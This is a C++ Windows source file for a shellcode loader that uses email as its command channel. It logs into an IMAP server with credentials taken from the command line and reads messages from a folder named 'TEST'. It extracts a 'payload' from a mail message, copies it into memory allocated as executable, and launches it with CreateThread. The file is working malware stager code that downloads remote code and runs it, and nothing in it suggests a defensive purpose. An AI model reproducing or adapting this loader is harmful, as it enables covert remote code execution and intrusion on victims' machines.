
#include <iostream>
#include <Windows.h>
#include <Iprtrmib.h>
#include <IPHlpApi.h>
#include "curlimap.h"
#include "imap.h"
#include "inetWin.h"

#pragma comment (lib, "libcurl.lib")
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "winmm.lib")
#pragma comment (lib, "wldap32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define IMAP_PORT 993

int main(int argc, char * argv[]){
	DWORD MessageID = 0;
	MessageID ++;
	curlImap cip;
	cip.setOptions(argv[3],argv[1],argv[2]);

	// 获取所有PAYLOAD邮件
	std::vector<USHORT>vUid;
	DWORD dwUidRet = cip.getUID("TEST",&vUid);
	if(dwUidRet != -1){
		for (UINT i = 0; i < vUid.size(); i++)
		{
			std::cout << vUid[i] << std::endl;
		}
	}

	// 更新邮件ID
	DWORD dwMailID = cip.updateMessageID(&MessageID,&vUid);

	std::string payloads = cip.getPayload(dwMailID);
	CHAR * shellcode = (CHAR *)VirtualAlloc(0,512*1024,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	lstrcpynA(shellcode,payloads.c_str(),payloads.length());
	std::cout <<  "[+]Payload Size : "<< payloads.length()/1024 << std::endl;
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)shellcode,(LPVOID)NULL,0,NULL);

	//cip.debugImapQuery(argv[3]);
	/*
	inetWin iwn;
	struct in_addr inAddr;
	struct sockaddr_in sockAddr;
	
	DWORD ret = iwn.findPort(80,&inAddr.S_un.S_addr);
	if(ret == -1){
		std::cout << "NOT FOUND ..." << std::endl;
	}
	sockAddr.sin_addr = inAddr;
	std::cout << inet_ntoa(inAddr);
	*/

	while(1){
	
		Sleep(5000);
		std::cout << "---"<<std::endl;
	
	}

	return 0;
	
  }